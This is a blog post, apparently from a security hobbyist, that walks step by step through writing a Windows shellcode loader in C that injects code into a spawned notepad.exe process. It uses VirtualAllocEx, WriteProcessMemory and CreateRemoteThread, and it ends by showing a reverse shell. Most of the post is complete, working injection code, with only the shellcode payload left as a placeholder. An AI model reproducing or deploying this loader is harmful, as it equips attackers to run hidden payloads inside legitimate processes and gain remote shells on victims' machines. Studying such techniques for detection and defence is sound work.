---
title: Writing a Shellcode Loader in C
date: 2025-01-24 00:00:00 +/-0000
categories: [Guides]
tags: []     # TAG names should always be lowercase
---
In my last post, I created a shellcode generator in C. Today, we're going to write a simple shellcode loader in C that uses process injection to run the shellcode we made.

Process injection is a well-known technique that uses the VirtualAllocEx function to write shellcode into a process, then uses CreateRemoteThread to execute the shellcode. It's overt because anything keeping track of the system will notice the VirtualAllocEx call that is setting memory to PAGE_EXECUTE_READWRITE, the creation of a remote thread in a different process, plus whatever the shellcode will do (i.e. using notepad to spawn a powershell session).

Our program will work like this:
1. Initialize the shellcode array and the Win32 structs we will need.
2. Use CreateProcess to start a notepad.exe process.
3. Set a shellcode-sized area of memory in the notepad process to read/write/execute.
4. Write the shellcode into this area of memory.
5. Start a new thread in the notepad process that will execute the shellcode.

***
**Creating a New Process**

To create a notepad.exe process, we have to initialize the STARTUPINFO and PROCESS_INFORMATION structs. The PROCESS_INFORMATION struct will be used later, as it contains a handle to the new process.

```c
#include <Windows.h>
#include <stdio.h>

int main()
{
    unsigned char shellcode[] = <shellcode block>;

    //create the needed structs and initialize to zero
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    
    LPCWSTR applicationName = L"C:\\Windows\\System32\\notepad.exe";

    CreateProcess(applicationName, NULL , NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
```

***
**Writing and Executing the Shellcode**
With the notepad.exe process created, we can use the pi.hProcess field with VirtualAllocEx to set an area of memory to PAGE_EXECUTE_READWRITE:
```c
HANDLE remoteThread;
PVOID remoteBuffer;

remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
```

VirtualAllocEx returns the base address of the allocated region. Now we can call WriteProcessMemory, which takes the handle to the notepad process, the base address of the memory to write to (in remoteBuffer), our shellcode, and the size of our shellcode.
```c
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);
```

With our shellcode in the memory of the notepad process, we can use CreateRemoteThread to create a new thread that runs in the notepad process, with its starting point at the base address of our shellcode.
```c
remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
```

Putting it all together:
```c
#include <Windows.h>

int main()
{
    unsigned char shellcode[] = <insert shellcode here>;

    //create a notepad process
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    LPCWSTR applicationName = L"C:\\Windows\\System32\\notepad.exe";

    CreateProcess(applicationName, NULL , NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    //open handle to our notepad process
    HANDLE remoteThread;
    PVOID remoteBuffer;

    remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);
    remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

    return 0;
}
```
Now we run our program and see notepad
![](assets/img/1-vc.png)

and here's our reverse shell
![](assets/img/2-rs.png)
